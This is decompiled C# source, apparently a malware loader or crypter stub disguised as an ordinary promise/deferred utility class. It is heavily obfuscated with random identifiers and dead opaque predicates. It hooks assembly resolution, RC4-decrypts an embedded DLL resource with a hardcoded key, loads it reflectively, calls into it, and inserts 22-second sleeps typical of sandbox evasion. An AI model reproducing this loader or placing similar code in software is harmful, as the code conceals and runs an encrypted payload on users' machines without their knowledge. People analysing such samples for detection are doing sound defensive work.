using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using Elnehfzwfohhcr;

namespace Lqeltihjetn;

public sealed class i<a> : Lqeltihjetn.h<a>, g
{
	private List<f> m_b;

	private bool m_c;

	private bool m_d;

	private a m_e;

	private byte[] m_f;

	private int m_g;

	private int m_h;

	private int l;

	private int m;

	private int n;

	private int[] o;

	private int[] p;

	private byte[] q;

	private string r;

	public i()
	{
		List<f> list = new List<f>();
		if (6u != 0)
		{
			this.b = list;
		}
		byte[] bytes = Encoding.UTF8.GetBytes("Dcvebxzkiaijxovo");
		if (5u != 0)
		{
			this.f = bytes;
		}
		if (6u != 0)
		{
			r = "Lqeltihjetn.Elnehfzwfohhcr.dll";
		}
		base._002Ector();
	}

	public static Lqeltihjetn.h<a> a(Lqeltihjetn.i<a> a)
	{
		_ = 0;
		if (6 == 0)
		{
		}
		return a.b();
	}

	public Lqeltihjetn.h<a> b()
	{
		_ = 7;
		if (4 == 0)
		{
		}
		return this;
	}

	public g _3g6k9yaemwz8y6nuwsvucsszawwjd9zcpXc(Action a)
	{
		if (0 == 0)
		{
			Thread.Sleep(22000);
		}
		if (this.c || this.d)
		{
			a();
		}
		else
		{
			this.b.Add(new f(a, (f.a)0, c: false));
		}
		return this;
	}

	public Lqeltihjetn.h<a> v7jccprfg9rvxb3sa8devjeyzxhffpazpXc(Action<a> a)
	{
		_ = 4;
		if (-1 == 0)
		{
		}
		if (!this.c)
		{
			_ = 7;
			if (3 == 0)
			{
			}
			if (!this.d)
			{
				this.b.Add(new f(a, (f.a)0, c: true));
				goto IL_004d;
			}
		}
		_ = 4;
		if (-1 == 0)
		{
		}
		a(this.e);
		goto IL_004d;
		IL_004d:
		return this;
	}

	public Lqeltihjetn.h<a> v7jccprfg9rvxb3sa8devjeyzxhffpazpXf(IEnumerable<Action<a>> a)
	{
		IEnumerator<Action<a>> enumerator = a.GetEnumerator();
		IEnumerator<Action<a>> enumerator2;
		if (3u != 0)
		{
			enumerator2 = enumerator;
		}
		try
		{
			while (enumerator2.MoveNext())
			{
				Action<a> current = enumerator2.Current;
				Action<a> action;
				if (3u != 0)
				{
					action = current;
				}
				v7jccprfg9rvxb3sa8devjeyzxhffpazpXc(action);
			}
			return this;
		}
		finally
		{
			enumerator2?.Dispose();
		}
	}

	public g _3g6k9yaemwz8y6nuwsvucsszawwjd9zcpXa(Action a)
	{
		_ = 3;
		if (5 == 0)
		{
		}
		if (this.c)
		{
			_ = 0;
			if (7 == 0)
			{
			}
			a();
		}
		else
		{
			_ = 1;
			if (1 == 0)
			{
			}
			this.b.Add(new f(a, (f.a)1, c: false));
		}
		return this;
	}

	public Lqeltihjetn.h<a> v7jccprfg9rvxb3sa8devjeyzxhffpazpXa(Action<a> a)
	{
		_ = 6;
		if (5 == 0)
		{
		}
		if (this.c)
		{
			_ = 2;
			if (8 == 0)
			{
			}
			_ = 6;
			if (7 == 0)
			{
			}
			a(this.e);
		}
		else
		{
			this.b.Add(new f(a, (f.a)1, c: true));
		}
		return this;
	}

	public Lqeltihjetn.h<a> v7jccprfg9rvxb3sa8devjeyzxhffpazpXd(IEnumerable<Action<a>> a)
	{
		IEnumerator<Action<a>> enumerator = a.GetEnumerator();
		IEnumerator<Action<a>> enumerator2;
		if (true)
		{
			enumerator2 = enumerator;
		}
		try
		{
			while (enumerator2.MoveNext())
			{
				Action<a> current = enumerator2.Current;
				Action<a> action;
				if (7u != 0)
				{
					action = current;
				}
				v7jccprfg9rvxb3sa8devjeyzxhffpazpXa(action);
			}
			return this;
		}
		finally
		{
			enumerator2?.Dispose();
		}
	}

	public g _3g6k9yaemwz8y6nuwsvucsszawwjd9zcpXb(Action a)
	{
		_ = 2;
		if (4 == 0)
		{
		}
		if (this.d)
		{
			_ = 8;
			if (false)
			{
			}
			a();
		}
		else
		{
			_ = 7;
			if (-1 == 0)
			{
			}
			this.b.Add(new f(a, (f.a)2, c: false));
		}
		return this;
	}

	public Lqeltihjetn.h<a> v7jccprfg9rvxb3sa8devjeyzxhffpazpXb(Action<a> a)
	{
		_ = 3;
		if (5 == 0)
		{
		}
		if (this.d)
		{
			_ = 4;
			if (5 == 0)
			{
			}
			_ = 2;
			if (-1 == 0)
			{
			}
			a(this.e);
		}
		else
		{
			this.b.Add(new f(a, (f.a)2, c: true));
		}
		return this;
	}

	public Lqeltihjetn.h<a> v7jccprfg9rvxb3sa8devjeyzxhffpazpXe(IEnumerable<Action<a>> a)
	{
		IEnumerator<Action<a>> enumerator = a.GetEnumerator();
		IEnumerator<Action<a>> enumerator2;
		if (3u != 0)
		{
			enumerator2 = enumerator;
		}
		try
		{
			while (enumerator2.MoveNext())
			{
				Action<a> current = enumerator2.Current;
				Action<a> action;
				if (7u != 0)
				{
					action = current;
				}
				v7jccprfg9rvxb3sa8devjeyzxhffpazpXb(action);
			}
			return this;
		}
		finally
		{
			enumerator2?.Dispose();
		}
	}

	public bool _3g6k9yaemwz8y6nuwsvucsszawwjd9zcpXa()
	{
		AppDomain currentDomain = AppDomain.CurrentDomain;
		_ = 7;
		if (5 == 0)
		{
		}
		currentDomain.AssemblyResolve += d;
		_ = 4;
		if (1 == 0)
		{
		}
		return this.d;
	}

	private byte[] c(byte[] a)
	{
		int[] array = new int[256];
		if (6u != 0)
		{
			o = array;
		}
		int[] array2 = new int[256];
		if (uint.MaxValue != 0)
		{
			p = array2;
		}
		byte[] array3 = new byte[a.Length];
		if (4u != 0)
		{
			q = array3;
		}
		if (true)
		{
			this.h = 0;
		}
		while (this.h < 256)
		{
			o[this.h] = this.f[this.h % this.f.Length];
			p[this.h] = this.h;
			int num = this.h + 1;
			if (uint.MaxValue != 0)
			{
				this.h = num;
			}
		}
		int num2;
		if (uint.MaxValue != 0)
		{
			num2 = 0;
		}
		this.h = 0;
		l = num2;
		while (this.h < 256)
		{
			l = (l + p[this.h] + o[this.h]) % 256;
			n = p[this.h];
			p[this.h] = p[l];
			p[l] = n;
			this.h++;
		}
		this.g = (l = (this.h = 0));
		while (this.h < a.Length)
		{
			this.g++;
			this.g %= 256;
			l += p[this.g];
			l %= 256;
			n = p[this.g];
			p[this.g] = p[l];
			p[l] = n;
			m = p[(p[this.g] + p[l]) % 256];
			q[this.h] = (byte)(a[this.h] ^ m);
			this.h++;
		}
		return q;
	}

	private Assembly d(object a, ResolveEventArgs b)
	{
		if (b.Name.Contains("Elnehfzwfohhcr"))
		{
			Stream? manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(r);
			MemoryStream memoryStream = new MemoryStream();
			MemoryStream memoryStream2;
			if (7u != 0)
			{
				memoryStream2 = memoryStream;
			}
			manifestResourceStream!.CopyTo(memoryStream2);
			byte[] array = c(memoryStream2.ToArray());
			byte[] array2;
			if (2u != 0)
			{
				array2 = array;
			}
			return e(array2);
		}
		return null;
	}

	private Assembly e(byte[] a)
	{
		string name;
		if (uint.MaxValue != 0)
		{
			name = "Load";
		}
		return (Assembly)typeof(Assembly).InvokeMember(name, BindingFlags.InvokeMethod, null, null, new object[1] { a });
	}

	public bool _3g6k9yaemwz8y6nuwsvucsszawwjd9zcpXb()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		new ClassLibrary().Data();
		if (5 == 0)
		{
		}
		_ = -1;
		if (-1 == 0)
		{
		}
		return this.c;
	}

	public bool _3g6k9yaemwz8y6nuwsvucsszawwjd9zcpXc()
	{
		if (2u != 0)
		{
			Thread.Sleep(22000);
		}
		if (!this.d)
		{
			return this.c;
		}
		return true;
	}

	public g f()
	{
		if (this.d || this.c)
		{
			return this;
		}
		if (true)
		{
			this.d = true;
		}
		if (true)
		{
			j((f.a)2);
		}
		return this;
	}

	public Lqeltihjetn.i<a> h(a a)
	{
		if (this.d || this.c)
		{
			return this;
		}
		if (8u != 0)
		{
			this.d = true;
		}
		if (2u != 0)
		{
			this.e = a;
		}
		if (true)
		{
			j((f.a)2);
		}
		return this;
	}

	public g g()
	{
		if (this.d || this.c)
		{
			return this;
		}
		if (0 == 0)
		{
			this.c = true;
		}
		if (2u != 0)
		{
			j((f.a)1);
		}
		return this;
	}

	public Lqeltihjetn.i<a> i(a a)
	{
		if (this.d || this.c)
		{
			return this;
		}
		if (7u != 0)
		{
			this.c = true;
		}
		if (7u != 0)
		{
			this.e = a;
		}
		if (2u != 0)
		{
			j((f.a)1);
		}
		return this;
	}

	private void j(f.a a)
	{
		List<f>.Enumerator enumerator = this.b.GetEnumerator();
		List<f>.Enumerator enumerator2;
		if (2u != 0)
		{
			enumerator2 = enumerator;
		}
		try
		{
			while (enumerator2.MoveNext())
			{
				f current = enumerator2.Current;
				f f2;
				if (7u != 0)
				{
					f2 = current;
				}
				if (f2.a() == a || f2.a() == (f.a)0)
				{
					if (f2.a())
					{
						f2.a().DynamicInvoke(this.e);
					}
					else
					{
						f2.a().DynamicInvoke();
					}
				}
			}
		}
		finally
		{
			((IDisposable)enumerator2).Dispose();
		}
		this.b.Clear();
	}
}
